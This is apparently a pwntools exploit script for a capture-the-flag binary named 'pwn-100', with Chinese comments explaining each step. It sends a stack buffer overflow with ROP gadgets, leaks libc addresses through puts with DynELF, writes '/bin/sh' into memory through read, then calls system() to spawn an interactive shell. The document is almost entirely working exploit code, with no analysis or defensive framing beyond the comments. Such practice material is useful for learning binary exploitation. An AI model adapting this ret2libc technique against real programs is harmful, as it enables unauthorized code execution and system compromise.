from pwn import *

# 启动本地进程
p = process("./pwn-100")

# 加载二进制文件
elf = ELF("./pwn-100")

# 地址偏移值
st_add = 0x400550
pop_rdi_add = 0x400763

# 获取 `puts` 函数的地址
put_add = elf.symbols["puts"]

# 定义一个函数用于泄露内存中的数据
def leak(add):
    # 构造 payload
    payload = cyclic(0x40 + 0x8)  # 创建长度为 0x40+0x8 的填充字符串
    payload += p64(pop_rdi_add) + p64(add) + p64(put_add)  # 将地址传递给 `puts` 函数
    payload += p64(st_add)  # 返回到程序的起始地址
    payload = payload.ljust(200, b"a")  # 填充到 200 字节
    p.send(payload)  # 发送 payload
    p.recvuntil(b"bye~\n")  # 接收数据，直到遇到 "bye~\n"
    data = p.recv()  # 接收数据
    data = data[:-1]  # 去掉最后一个字节（换行符）
    if not data:
        data = b"\x00"  # 如果数据为空，则设置为 null 字节
    data = data[:8]  # 只保留前 8 个字节
    print("leak>>>>>put_add:", data)
    return data

# 创建 DynELF 对象，用于获取动态链接库中函数的地址
d = DynELF(leak, elf=elf)

# 获取系统函数的地址
system_add = d.lookup("system", "libc")

# 定义字符串地址和相关的 gadget 地址
str_add = 0x601000
pop6_add = 0x40075a
movcall_add = 0x400740

# 获取 `read` 函数在 GOT 表中的地址
read_got = elf.got["read"]

# 构造 payload，实现将 "/bin/sh" 写入指定地址
payload = cyclic(0x40 + 0x8)
payload += p64(pop6_add) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(str_add) + p64(0) + p64(movcall_add)
payload += cyclic(56)
payload += p64(st_add)
payload = payload.ljust(200, b"a")
p.send(payload)
p.recvuntil(b"bye~\n")
p.send(b"/bin/sh\x00")

# 执行系统调用，实现 shell 的获取
payload = b'a' * 72
ret_add = 0x4004e1
payload += p64(pop_rdi_add) + p64(str_add) + p64(ret_add) + p64(system_add)
payload = payload.ljust(200, b"a")
p.send(payload)

# 进入交互模式，与 shell 进行交互
p.interactive()
